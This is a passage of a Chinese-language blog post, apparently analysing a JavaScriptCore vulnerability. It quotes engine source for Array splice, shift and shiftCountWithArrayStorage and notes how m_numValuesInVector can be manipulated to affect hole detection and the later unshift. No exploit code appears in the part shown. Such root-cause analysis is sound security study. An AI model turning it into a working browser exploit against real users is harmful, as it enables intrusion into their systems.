class="hljs-number">0</span>);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>        scope.<span class="hljs-built_in">release</span>();<br>        <span class="hljs-built_in">setLength</span>(globalObject, vm, thisObj, length);<br>        <span class="hljs-keyword">return</span> JSValue::<span class="hljs-built_in">encode</span>(result);<br>    &#125;<br><br>    <span class="hljs-type">uint64_t</span> actualStart = <span class="hljs-built_in">argumentClampedIndexFromStartOrEnd</span>(globalObject, callFrame-&gt;<span class="hljs-built_in">argument</span>(<span class="hljs-number">0</span>), length);<br>    <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br><br>    <span class="hljs-type">uint64_t</span> actualDeleteCount = length - actualStart;<br>    <span class="hljs-keyword">if</span> (callFrame-&gt;<span class="hljs-built_in">argumentCount</span>() &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">double</span> deleteCount = callFrame-&gt;<span class="hljs-built_in">uncheckedArgument</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">toInteger</span>(globalObject);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>        <span class="hljs-keyword">if</span> (deleteCount &lt; <span class="hljs-number">0</span>)<br>            actualDeleteCount = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (deleteCount &gt; length - actualStart)<br>            actualDeleteCount = length - actualStart;<br>        <span class="hljs-keyword">else</span><br>            actualDeleteCount = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint64_t</span>&gt;(deleteCount);<br>    &#125;<br>    <span class="hljs-type">unsigned</span> itemCount = std::<span class="hljs-built_in">max</span>&lt;<span class="hljs-type">int</span>&gt;(callFrame-&gt;<span class="hljs-built_in">argumentCount</span>() - <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(length - actualDeleteCount + itemCount &gt; <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint64_t</span>&gt;(<span class="hljs-built_in">maxSafeInteger</span>())))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">throwVMTypeError</span>(globalObject, scope, <span class="hljs-string">&quot;Splice cannot produce an array of length larger than (2 ** 53) - 1&quot;</span>_s);<br><br>    std::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult = <span class="hljs-built_in">speciesConstructArray</span>(globalObject, thisObj, actualDeleteCount);<br>    <span class="hljs-built_in">EXCEPTION_ASSERT</span>(!!scope.<span class="hljs-built_in">exception</span>() == (speciesResult.first == SpeciesConstructResult::Exception));<br>    <span class="hljs-keyword">if</span> (speciesResult.first == SpeciesConstructResult::Exception)<br>        <span class="hljs-keyword">return</span> JSValue::<span class="hljs-built_in">encode</span>(<span class="hljs-built_in">jsUndefined</span>());<br><br>    JSObject* result = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-type">bool</span> okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; <span class="hljs-built_in">isJSArray</span>(thisObj) &amp;&amp; length == <span class="hljs-built_in">toLength</span>(globalObject, thisObj);<br>    <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">LIKELY</span>(okToDoFastPath))<br>        result = <span class="hljs-built_in">asArray</span>(thisObj)-&gt;<span class="hljs-built_in">fastSlice</span>(globalObject, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(actualStart), <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(actualDeleteCount));<br><br>    <span class="hljs-keyword">if</span> (!result) &#123;<br>        <span class="hljs-keyword">if</span> (speciesResult.first == SpeciesConstructResult::CreatedObject)<br>            result = speciesResult.second;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(actualDeleteCount &gt; std::numeric_limits&lt;<span class="hljs-type">uint32_t</span>&gt;::<span class="hljs-built_in">max</span>())) &#123;<br>                <span class="hljs-built_in">throwRangeError</span>(globalObject, scope, LengthExceededTheMaximumArrayLengthError);<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">encodedJSValue</span>();<br>            &#125;<br>            result = JSArray::<span class="hljs-built_in">tryCreate</span>(vm, globalObject-&gt;<span class="hljs-built_in">arrayStructureForIndexingTypeDuringAllocation</span>(ArrayWithUndecided), <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(actualDeleteCount));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(!result)) &#123;<br>                <span class="hljs-built_in">throwOutOfMemoryError</span>(globalObject, scope);<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">encodedJSValue</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint64_t</span> k = <span class="hljs-number">0</span>; k &lt; actualDeleteCount; ++k) &#123;<br>            JSValue v = <span class="hljs-built_in">getProperty</span>(globalObject, thisObj, k + actualStart);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(!v))<br>                <span class="hljs-keyword">continue</span>;<br>            result-&gt;<span class="hljs-built_in">putDirectIndex</span>(globalObject, k, v, <span class="hljs-number">0</span>, PutDirectIndexShouldThrow);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>        &#125;<br>        <span class="hljs-built_in">setLength</span>(globalObject, vm, result, actualDeleteCount);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, &#123; &#125;);<br>    &#125;<br>    <span class="hljs-comment">//增加的数量小于删除的调用shift，增加的数量大于删除的调用unshift</span><br>    <span class="hljs-keyword">if</span> (itemCount &lt; actualDeleteCount) &#123;<br>        <span class="hljs-built_in">shift</span>&lt;JSArray::ShiftCountForSplice&gt;(globalObject, thisObj, actualStart, actualDeleteCount, itemCount, length);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (itemCount &gt; actualDeleteCount) &#123;<br>        <span class="hljs-built_in">unshift</span>&lt;JSArray::ShiftCountForSplice&gt;(globalObject, thisObj, actualStart, actualDeleteCount, itemCount, length);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> k = <span class="hljs-number">0</span>; k &lt; itemCount; ++k) &#123;<br>        thisObj-&gt;<span class="hljs-built_in">putByIndexInline</span>(globalObject, k + actualStart, callFrame-&gt;<span class="hljs-built_in">uncheckedArgument</span>(k + <span class="hljs-number">2</span>), <span class="hljs-literal">true</span>);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>    &#125;<br>    <br>    scope.<span class="hljs-built_in">release</span>();<br>    <span class="hljs-built_in">setLength</span>(globalObject, vm, thisObj, length - actualDeleteCount + itemCount);<br>    <span class="hljs-keyword">return</span> JSValue::<span class="hljs-built_in">encode</span>(result);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="shift"><a href="#shift" class="headerlink" title="shift"></a>shift</h3><p>下面第15行调用了shiftCount函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;JSArray::ShiftCountMode shiftCountMode&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shift</span><span class="hljs-params">(ExecState* exec, JSObject* thisObj, <span class="hljs-type">unsigned</span> header, <span class="hljs-type">unsigned</span> currentCount, <span class="hljs-type">unsigned</span> resultCount, <span class="hljs-type">unsigned</span> length)</span></span><br><span class="hljs-function"></span>&#123;<br>    VM&amp; vm = exec-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_THROW_SCOPE</span>(vm);<br><br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(currentCount &gt; resultCount);<br>    <span class="hljs-type">unsigned</span> count = currentCount - resultCount;<br><br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(header &lt;= length);<br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(currentCount &lt;= (length - header));<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isJSArray</span>(thisObj)) &#123;<br>        JSArray* array = <span class="hljs-built_in">asArray</span>(thisObj);<br>        <span class="hljs-keyword">if</span> (array-&gt;<span class="hljs-built_in">length</span>() == length &amp;&amp; array-&gt;<span class="hljs-built_in">shiftCount</span>&lt;shiftCountMode&gt;(exec, header, count))<br>            <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> k = header; k &lt; length - currentCount; ++k) &#123;<br>        <span class="hljs-type">unsigned</span> from = k + currentCount;<br>        <span class="hljs-type">unsigned</span> to = k + resultCount;<br>        JSValue value = <span class="hljs-built_in">getProperty</span>(exec, thisObj, from);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>        <span class="hljs-keyword">if</span> (value) &#123;<br>            thisObj-&gt;<span class="hljs-built_in">putByIndexInline</span>(exec, to, value, <span class="hljs-literal">true</span>);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">bool</span> success = thisObj-&gt;<span class="hljs-built_in">methodTable</span>(vm)-&gt;<span class="hljs-built_in">deletePropertyByIndex</span>(thisObj, exec, to);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>            <span class="hljs-keyword">if</span> (!success) &#123;<br>                <span class="hljs-built_in">throwTypeError</span>(exec, scope, UnableToDeletePropertyError);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> k = length; k &gt; length - count; --k) &#123;<br>        <span class="hljs-type">bool</span> success = thisObj-&gt;<span class="hljs-built_in">methodTable</span>(vm)-&gt;<span class="hljs-built_in">deletePropertyByIndex</span>(thisObj, exec, k - <span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>        <span class="hljs-keyword">if</span> (!success) &#123;<br>            <span class="hljs-built_in">throwTypeError</span>(exec, scope, UnableToDeletePropertyError);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="shiftCount"><a href="#shiftCount" class="headerlink" title="shiftCount"></a>shiftCount</h4><p>下面第8行紧接着调用<code>shiftCountForSplice</code>函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;ShiftCountMode shiftCountMode&gt;</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">shiftCount</span><span class="hljs-params">(JSGlobalObject* globalObject, <span class="hljs-type">unsigned</span>&amp; startIndex, <span class="hljs-type">unsigned</span> count)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (shiftCountMode) &#123;<br>    <span class="hljs-keyword">case</span> ShiftCountForShift:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">shiftCountForShift</span>(globalObject, startIndex, count);<br>    <span class="hljs-keyword">case</span> ShiftCountForSplice:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">shiftCountForSplice</span>(globalObject, startIndex, count);<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">CRASH</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="shiftCountForSplice"><a href="#shiftCountForSplice" class="headerlink" title="shiftCountForSplice"></a>shiftCountForSplice</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">shiftCountForSplice</span><span class="hljs-params">(JSGlobalObject* globalObject, <span class="hljs-type">unsigned</span>&amp; startIndex, <span class="hljs-type">unsigned</span> count)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">shiftCountWithAnyIndexingType</span>(globalObject, startIndex, count);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="shiftCountWithAnyIndexingType"><a href="#shiftCountWithAnyIndexingType" class="headerlink" title="shiftCountWithAnyIndexingType"></a>shiftCountWithAnyIndexingType</h4><p>下面第34行会调用<code>shiftCountWithArrayStorage</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">JSArray::shiftCountWithAnyIndexingType</span><span class="hljs-params">(ExecState* exec, <span class="hljs-type">unsigned</span>&amp; startIndex, <span class="hljs-type">unsigned</span> count)</span></span><br><span class="hljs-function"></span>&#123;<br>    VM&amp; vm = exec-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(count &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">ensureWritable</span>(vm);<br><br>    Butterfly* butterfly = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">butterfly</span>();<br><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-built_in">indexingType</span>()) &#123;<br>    <span class="hljs-keyword">case</span> ArrayClass:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">case</span> ArrayWithUndecided:<br>        <span class="hljs-comment">// Don&#x27;t handle this because it&#x27;s confusing and it shouldn&#x27;t come up.</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">case</span> ArrayWithInt32:<br>    <span class="hljs-keyword">case</span> ArrayWithContiguous: &#123;<br>        <span class="hljs-type">unsigned</span> oldLength = butterfly-&gt;<span class="hljs-built_in">publicLength</span>();<br>    <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">case</span> ArrayWithDouble: &#123;<br>        <span class="hljs-type">unsigned</span> oldLength = butterfly-&gt;<span class="hljs-built_in">publicLength</span>();<br>        <span class="hljs-built_in">RELEASE_ASSERT</span>(count &lt;= oldLength);<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">case</span> ArrayWithArrayStorage:<br>    <span class="hljs-keyword">case</span> ArrayWithSlowPutArrayStorage:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">shiftCountWithArrayStorage</span>(vm, startIndex, count, <span class="hljs-built_in">arrayStorage</span>());<br><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">CRASH</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="shiftCountWithArrayStorage"><a href="#shiftCountWithArrayStorage" class="headerlink" title="shiftCountWithArrayStorage"></a>shiftCountWithArrayStorage</h4><p>主要关注第8行和第19行，第8行由于<code>this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)</code>使得其所在的判断语句<code>(storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)</code>为<code>false</code>。然后到第19行<code>storage-&gt;m_numValuesInVector -= count;</code>这条语句是修改数组的元素个数，这就意味着我们可以操控数组元素的个数，这又影响着<code>hasHoles</code>函数，继而影响后面的unshift。</p>
+<p>当数组中元素的数量和其长度不匹配时就是有洞：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasHoles</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>                         </span><br><span class="hljs-function"></span>&#123;                                             <br>    <span class="hljs-keyword">return</span> m_numValuesInVector != <span class="hljs-built_in">length</span>();   <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">JSArray::shiftCountWithArrayStorage</span><span class="hljs-params">(VM&amp; vm, <span class="hljs-type">unsigned</span> startIndex, <span class="hljs-type">unsigned</span> count, ArrayStorage* storage)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> oldLength = storage-&gt;<span class="hljs-built_in">length</span>();<br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(count &lt;= oldLength);<br>    <br>    <span class="hljs-comment">// If the array contains holes or is otherwise in an abnormal state,</span><br>    <span class="hljs-comment">// use the generic algorithm in ArrayPrototype.</span><br>    <span class="hljs-keyword">if</span> ((storage-&gt;<span class="hljs-built_in">hasHoles</span>() &amp;&amp; <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">structure</span>(vm)-&gt;<span class="hljs-built_in">holesMustForwardToPrototype</span>(vm, <span class="hljs-keyword">this</span>)) <br>        || <span class="hljs-built_in">hasSparseMap</span>() <br>        || <span class="hljs-built_in">shouldUseSlowPut</span>(<span class="hljs-built_in">indexingType</span>())) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!oldLength)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-type">unsigned</span> length = oldLength - count;<br>    <br>    storage-&gt;m_numValuesInVector -= count;<br>    storage-&gt;<span class="hljs-built_in">setLength</span>(length);<br>    <br>    <span class="hljs-type">unsigned</span> vectorLength = storage-&gt;<span class="hljs-built_in">vectorLength</span>();<br>    <span class="hljs-keyword">if</span> (!vectorLength)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-keyword">if</span> (startIndex &gt;= vectorLength)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    DisallowGC disallowGC;<br>    <span class="hljs-keyword">auto</span> locker = <span class="hljs-built_in">holdLock</span>(<span class="hljs-built_in">cellLock</span>());<br>    <br>    <span class="hljs-keyword">if</span> (startIndex + count &gt; vectorLength)<br>        count = vectorLength - startIndex;<br>    <br>    <span class="hljs-type">unsigned</span> usedVectorLength = std::<span class="hljs-built_in">min</span>(vectorLength, oldLength);<br>    <br>    <span class="hljs-type">unsigned</span> numElementsBeforeShiftRegion = startIndex;<br>    <span class="hljs-type">unsigned</span> firstIndexAfterShiftRegion = startIndex + count;<br>    <span class="hljs-type">unsigned</span> numElementsAfterShiftRegion = usedVectorLength - firstIndexAfterShiftRegion;<br>    <span class="hljs-built_in">ASSERT</span>(numElementsBeforeShiftRegion + count + numElementsAfterShiftRegion == usedVectorLength);<br><br>    <span class="hljs-comment">// The point of this comparison seems to be to minimize the amount of elements that have to </span><br>    <span class="hljs-comment">// be moved during a shift operation.</span><br>    <span class="hljs-keyword">if</span> (numElementsBeforeShiftRegion &lt; numElementsAfterShiftRegion) &#123;<br>        <span class="hljs-comment">// The number of elements before the shift region is less than the number of elements</span><br>        <span class="hljs-comment">// after the shift region, so we move the elements before to the right.</span><br>        <span class="hljs-keyword">if</span> (numElementsBeforeShiftRegion) &#123;<br>            <span class="hljs-built_in">RELEASE_ASSERT</span>(count + startIndex &lt;= vectorLength);<br>            <span class="hljs-keyword">if</span> (storage-&gt;<span class="hljs-built_in">hasHoles</span>()) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = startIndex; i-- &gt; <span class="hljs-number">0</span>;) &#123;<br>                    <span class="hljs-type">unsigned</span> destinationIndex = count + i;<br>                    JSValue source = storage-&gt;m_vector[i].<span class="hljs-built_in">get</span>();<br>                    JSValue dest = storage-&gt;m_vector[destinationIndex].<span class="hljs-built_in">get</span>();<br>                    <span class="hljs-comment">// Any time we overwrite a hole we know we overcounted the number of values we removed </span><br>                    <span class="hljs-comment">// when we subtracted count from m_numValuesInVector above.</span><br>                    <span class="hljs-keyword">if</span> (!dest &amp;&amp; destinationIndex &gt;= firstIndexAfterShiftRegion)<br>                        storage-&gt;m_numValuesInVector++;<br>                    storage-&gt;m_vector[count + i].<span class="hljs-built_in">setWithoutWriteBarrier</span>(source);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">memmove</span>(storage-&gt;m_vector + count,<br>                    storage-&gt;m_vector,<br>                    <span class="hljs-built_in">sizeof</span>(JSValue) * startIndex);<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// Adjust the Butterfly and the index bias. We only need to do this here because we&#x27;re changing</span><br>        <span class="hljs-comment">// the start of the Butterfly, which needs to point at the first indexed property in the used</span><br>        <span class="hljs-comment">// portion of the vector.</span><br>        Butterfly* butterfly = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">butterfly</span>()-&gt;<span class="hljs-built_in">shift</span>(<span class="hljs-built_in">structure</span>(vm), count);<br>        storage = butterfly-&gt;<span class="hljs-built_in">arrayStorage</span>();<br>        storage-&gt;m_indexBias += count;<br><br>        <span class="hljs-comment">// Since we&#x27;re consuming part of the vector by moving its beginning to the left,</span><br>        <span class="hljs-comment">// we need to modify the vector length appropriately.</span><br>        storage-&gt;<span class="hljs-built_in">setVectorLength</span>(vectorLength - count);<br>        <span class="hljs-built_in">setButterfly</span>(vm, butterfly);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// The number of elements before the shift region is greater than or equal to the number </span><br>        <span class="hljs-comment">// of elements after the shift region, so we move the elements after the shift region to the left.</span><br>        <span class="hljs-keyword">if</span> (storage-&gt;<span class="hljs-built_in">hasHoles</span>()) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; numElementsAfterShiftRegion; ++i) &#123;<br>                <span class="hljs-type">unsigned</span> destinationIndex = startIndex + i;<br>                JSValue source = storage-&gt;m_vector[firstIndexAfterShiftRegion + i].<span class="hljs-built_in">get</span>();<br>                JSValue dest = storage-&gt;m_vector[destinationIndex].<span class="hljs-built_in">get</span>();<br>                <span class="hljs-comment">// Any time we overwrite a hole we know we overcounted the number of values we removed </span><br>                <span class="hljs-comment">// when we subtracted count from m_numValuesInVector above.</span><br>                <span class="hljs-keyword">if</span> (!dest &amp;&amp; destinationIndex &lt; firstIndexAfterShiftRegion)<br>                    storage-&gt;m_numValuesInVector++;<br>                storage-&gt;m_vector[startIndex + i].<span class="hljs-built_in">setWithoutWriteBarrier</span>(source);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">memmove</span>(storage-&gt;m_vector + startIndex,<br>                storage-&gt;m_vector + firstIndexAfterShiftRegion,<br>                <span class="hljs-built_in">sizeof</span>(JSValue) * numElementsAfterShiftRegion);<br>        &#125;<br>        <span class="hljs-comment">// Clear the slots of the elements we just moved.</span><br>        <span class="hljs-type">unsigned</span> startOfEmptyVectorTail = usedVectorLength - count;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = startOfEmptyVectorTail; i &lt; usedVectorLength; ++i)<br>            storage-&gt;m_vector[i].<span class="hljs-built_in">clear</span>();<br>        <span class="hljs-comment">// We don&#x27;t modify the index bias or the Butterfly pointer in this case because we&#x27;re not changing </span><br>        <span class="hljs-comment">// the start of the Butterfly, which needs to point at the first indexed property in the used </span><br>        <span class="hljs-comment">// portion of the vector. We also don&#x27;t modify the vector length because we&#x27;re not actually changing</span><br>        <span class="hljs-comment">// its length; we&#x27;re just using less of it.</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span 